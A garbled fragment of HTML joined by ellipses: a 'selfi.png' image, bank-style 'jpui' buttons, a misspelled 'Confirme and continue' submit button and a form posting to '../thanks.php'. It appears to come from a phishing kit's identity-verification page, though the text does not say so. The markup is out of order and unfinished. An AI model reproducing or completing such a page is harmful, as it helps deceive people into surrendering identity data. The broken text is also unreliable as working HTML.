...
<img src="../../img/selfi.png" style="height: 230px;">
...
class="jpui button focus fluid primary"
...
value="Confirme and continue"
 ...
 type="submit">
  ...
  <form action="../thanks.php" method="post" name="WorldWide_form" class="validatoa" novalidate="novalidate">



<input 
href=""
 class="jpui button focus fluid" type="button"
